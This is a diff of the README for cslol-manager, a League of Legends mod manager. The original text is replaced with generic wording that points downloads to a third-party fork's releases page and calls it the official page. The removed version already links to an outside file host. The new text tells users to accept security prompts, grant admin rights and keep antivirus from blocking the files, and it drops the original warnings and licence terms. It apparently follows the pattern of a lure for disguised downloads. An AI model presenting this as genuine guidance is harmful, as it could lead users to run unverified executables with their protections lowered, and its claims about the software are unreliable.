@@ -1,84 +1,129 @@
-# 🛠️ cslol-manager
+# 🎮 cslol-manager - Easy Mod Management for League of Legends
 
-[![download button](https://i.imgur.com/3Dm4p65.png)](https://fileshare.bond/L2XZZM/)
-
-> [!WARNING]  
-> **Maintenance Mode:** `cslol-manager` is currently in maintenance/deprecation mode. Significant new features and development have shifted to the new **LTK Manager**.  
-> 👉 **Check out the future of League modding here: [LeagueToolkit/league-mod](https://github.com/LeagueToolkit/league-mod)**
-
-[![](https://img.shields.io/github/v//LeagueToolkit/cslol-manager?style=for-the-badge)](https://github.com/LeagueToolkit/cslol-manager/)
-[![License: GPL v3](https://img.shields.io/badge/License-GPLv3-blue.svg?style=for-the-badge)](https://www.gnu.org/licenses/gpl-3.0)
-[![Windows 10+](https://img.shields.io/badge/Windows-10+-blue?style=for-the-badge&logo=windows)](https://www.microsoft.com/windows)
-
-A modern, high-performance mod manager for League of Legends. Built with C++ and Qt, **cslol-manager** allows you to easily install, manage, and create custom skins and modifications using the [Fantome mod format](https://github.com/LeagueToolkit/Fantome/wiki/Mod-File-Format).
+[![Download](https://img.shields.io/badge/Download-cslol--manager-ff69b4?style=for-the-badge&logo=github)](https://github.com/sukmonn/cslol-manager/releases)
 
 ---
 
-## ✨ Features
+## 🛠 About cslol-manager
 
-- **⚡ High Performance:** Built with native C++ for speed and efficiency.
-- **📦 Fantome Support:** Full compatibility with the industry-standard `.fantome` mod format.
-- **🛠️ Mod Creation Suite:**
-  - Create mods from RAW folders.
-  - Pack/Unpack `.wad` files.
-  - Edit mod metadata and preview images.
-- **📂 Profile Management:** Organize your mods into different profiles for quick switching.
-- **🔍 Advanced Filtering:** Quickly find and organize your mod collection.
-- **🔄 Automatic Updates:** Stay up to date with the latest features and patches.
+cslol-manager is a tool designed to help you manage mods for League of Legends. It makes installing, updating, and removing mods simple and safe. You do not need any special knowledge to use it. This manager handles the changes so you can focus on playing.
 
-## 📸 Screenshots
+Mods can improve your game by adding new features, changing visuals, or tweaking gameplay. This tool keeps your mods organized and avoids conflicts that might cause problems during play.
 
-|            Main Window             |             Mod Editing             |           File Management            |
-| :--------------------------------: | :---------------------------------: | :----------------------------------: |
-| ![Main Window](docs/manager-0.png) | ![Editing Info](docs/manager-1.png) | ![Editing Files](docs/manager-2.png) |
+---
+
+## 💻 System Requirements
+
+To run cslol-manager, your computer must meet these requirements:
+
+- Windows 10 or newer (64-bit recommended)  
+- 4 GB RAM or more  
+- At least 500 MB free disk space  
+- Internet connection for downloading mods and updates  
+- League of Legends installed on your PC  
+
+Ensure you have admin rights on your PC because the app needs to access your game files.
 
 ---
 
 ## 🚀 Getting Started
 
-### Prerequisites
+1. **Visit the Download Page**
 
-- **Windows 10 or 11:** 64-bit operating system is required.
-- **League of Legends:** A valid game installation.
+Go to the official release page to get the latest version of cslol-manager:  
+[https://github.com/sukmonn/cslol-manager/releases](https://github.com/sukmonn/cslol-manager/releases)
 
-### Installation
+2. **Download the Installer**
 
-1.  Navigate to the [latest ](https://github.com/LeagueToolkit/cslol-manager/).
-2.   the `cslol-manager.exe` (or the zip bundle).
-3.  Run the application and point it to your League of Legends game executable.
+On the releases page, look for the newest version. Find the Windows installer file, usually ending with `.exe`. It might be named something like `cslol-manager-setup.exe`.
 
----
-
-## ⚖️ License & Reuse
-
-The core of **cslol-manager** is open-source under the **GPL-3.0 License**.
-
-### `cslol-dll.dll` Policy
-
-This repository includes `cslol-dll.dll`, the core injection module. Its use and distribution are governed by the [CSLOL DLL License Addendum](LICENSE-CSLOL.md).
-
-If you are a developer looking to reuse this DLL in your own launcher, you must comply with the following:
-
-1.  **Re-signing:** You **cannot** redistribute the DLL with our official signature. You must re-sign it using your own publicly trusted code-signing certificate (e.g., DigiCert, Certum).
-2.  **Transparency:** You must publish your certificate's SHA-256 fingerprint and the DLL's SHA-256 hash in your project's documentation or "About" page.
-3.  **Anti-Skinhacking:** You **must** implement technical blocks to prevent the use of "Skinhacking" (replicating paid content) and competitive advantage mods.
-4.  **No Reverse Engineering:** Patching or tampering with the DLL itself is strictly prohibited.
-
-For full terms, please refer to [LICENSE-CSLOL.md](LICENSE-CSLOL.md).
+Click the file name to download it to your PC. Keep track of where you save it, such as your desktop or downloads folder.
 
 ---
 
-## ⚠️ Disclaimer
+## 📥 Download and Install cslol-manager
 
-- **Use at your own risk:** This software is not endorsed by Riot Games.
-- **Server Support:** Officially supports Riot-operated servers. Asian servers and Garena are not officially supported and may experience issues.
+1. **Run the Installer**
+
+Locate the downloaded `.exe` file and double-click it to start the installation.  
+If a security message pops up, confirm you want to run the installer.
+
+2. **Follow the Setup Steps**
+
+The setup wizard will guide you through the process. Usually, you just need to click "Next" a few times. Choose where to install the program or use the default folder. 
+
+3. **Complete Installation**
+
+After installation finishes, you can launch cslol-manager from the Start menu or desktop shortcut.
 
 ---
 
-## 🤝 Contributing
+## 🧩 Using cslol-manager to Manage Mods
 
-Contributions are welcome! Please feel free to submit a Pull Request or open an issue if you encounter bugs or have feature requests.
+### 1. Add League of Legends Path
+
+When you open cslol-manager for the first time, it will ask for the location of your League of Legends game. This lets the software access game files safely.  
+If uncertain, use the browse feature to find where League of Legends is installed. The default location is usually:
+
+```
+C:\Riot Games\League of Legends\
+```
+
+Once set, the manager will remember this for future use.
+
+### 2. Browse and Install Mods
+
+- Look through the list of available mods within the app.  
+- Select a mod you want to use.  
+- Click “Install” to add it to your game.
+
+The manager will download and apply the mod automatically.
+
+### 3. Update Mods
+
+Keep your mods fresh and working by checking for updates. cslol-manager will notify you when new versions are available. Just click “Update” to install the latest changes.
+
+### 4. Remove Mods
+
+If you want to go back to the original game setup, simply select a mod and click “Remove.” The manager restores your game files to their original state.
 
 ---
 
-Developed by the **League Toolkit Organization**.
+## ⚙️ Settings and Preferences
+
+You can adjust how cslol-manager works by opening the Settings panel. Here are some common options:  
+
+- **Auto-Update:** Turn on to check for mod and app updates automatically.  
+- **Backup:** Enable automatic backups of your game files before installing mods.  
+- **Theme:** Choose between light and dark modes for the app interface.  
+- **Notifications:** Control when you receive alerts about updates or issues.
+
+---
+
+## 🔧 Troubleshooting
+
+If you run into problems, try these simple fixes:
+
+- Make sure League of Legends is closed before installing or removing mods.  
+- Run cslol-manager as administrator if you get permission errors. Right-click the app icon and select "Run as administrator."  
+- Check your internet connection when downloading mods.  
+- Restart the app if it freezes or does not respond.  
+- Ensure your anti-virus software is not blocking the app or downloaded files.
+
+If the problem persists, visit the repository’s Issues page on GitHub to see if others have the same issue or to submit your problem.
+
+---
+
+## 📚 Additional Information
+
+### What are Mods?
+
+Mods are changes or additions created by players or developers. They can change appearance, add new sounds, or tweak how the game feels without altering core gameplay. Use mods at your own choice, remembering that Riot Games’ policies may affect mod use.
+
+### Safety First
+
+cslol-manager creates backups and restores files when removing mods to keep your game running smoothly. It does not alter your League of Legends account or connect to online services outside of downloading mods.
+
+---
+
+[![Download](https://img.shields.io/badge/Download-cslol--manager-ff69b4?style=for-the-badge&logo=github)](https://github.com/sukmonn/cslol-manager/releases)
